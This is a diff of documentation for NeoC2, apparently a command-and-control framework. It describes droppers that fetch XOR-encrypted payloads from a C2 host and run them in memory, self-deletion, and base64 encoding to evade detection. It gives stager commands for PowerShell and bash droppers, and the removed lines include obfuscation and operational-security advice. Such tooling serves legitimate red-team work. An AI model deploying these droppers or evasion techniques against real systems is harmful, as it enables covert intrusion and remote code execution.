@@ -106,8 +106,7 @@ After XOR Decryption. Instead of writing the decrypted payload to disk, which wo
 - **Self-deletes** after execution
 - **Encoded** in base64 to evade simple string detection
 - **Binary payload support**: Can execute binary files after temporary storage
-- **Python payload support**: Can execute Python scripts in-memory (stealthy)
-
+- **Python payload support**: Can execute Python scripts 
 ### Usage
 ```
 stager generate powershell_dropper host=<c2_host> port=<c2_port> [protocol=https] [download_uri=/api/assets/main.js]
@@ -124,25 +123,15 @@ NeoC2 supports uploading custom payloads directly through the web interface, all
 ### Capabilities
 - **Multi-Format Support**: Upload EXE, DLL, PY, JS, VBS, BAT, PS1, and other binary/script files
 - **Encryption**: XOR encryption using SECRET_KEY environment variable with Base64 encoding
-- **Web Interface**: Easy upload via Tools > Payload Upload in the web UI
 - **Automatic Serving**: Uploaded payloads automatically available at `/api/assets/main.js`
 - **Intelligent Execution**: Droppers automatically detect payload type and handle appropriately
 - **Maximum Size**: Supports payloads up to 50MB
 - **Overwrite Functionality**: New uploads replace previous payloads
-- **Python Support**: Python scripts execute in-memory (stealthy)
-- **Binary Support**: Binary files execute from temporary location with automatic cleanup
-
-### Usage
-1. Navigate to **Tools > Payload Upload** in the web interface
-2. Select your payload file (EXE, DLL, PY, JS, etc.) up to 50MB
-3. The payload is automatically XOR encrypted and Base64 encoded
-4. Use droppers to download from `/api/assets/main.js` and execute the payload
-5. The same endpoint works with cross-platform stager
 
 #### Example Usage:
 ```
-# Upload your binary/exe file via the web client
-# Then deploy droppers pointing to web client PROTOCOL://IP:PORT
+NeocC2 > payload_upload <options>
+# Then deploy droppers 
 NeoC2 > stager generate powershell_dropper host=<c2_host> port=<c2_port>
 NeoC2 > stager generate bash_dropper host=<c2_host> port=<c2_port>
 ```
@@ -162,32 +151,8 @@ All agents utilize communication profiles for consistent C2 communication. Profi
 - Heartbeat behavior
 - Communication protocols (HTTP/HTTPS)
 
-Profiles can be managed via:
-- Web UI: Profiles section
+Profiles can added via:
 - CLI: `profile add <json_file>`
-- Programmatically through the API
 
 ---
-
-## Security Considerations
-
-### Obfuscation Techniques
-- **Polymorphic Variables**: All agents use randomized variable and function names
-- **Dead Code Injection**: Benign code is injected to increase entropy
-- **String Encoding**: Sensitive strings are encoded using various techniques
-- **Control Flow Obfuscation**: Code execution patterns are randomized
-
-### Detection Vectors
-- Network traffic patterns to C2 server
-- Process creation patterns
-- File system artifacts (if any)
-- Memory artifacts during execution
-
-
-### Operational Security
-- Use HTTPS where possible for C2 communication
-- Implement proper domain fronting when available
-- Use appropriate sleep intervals and jitter settings
-- Consider the target environment's security posture
-- Test agents in similar environments before deployment
 
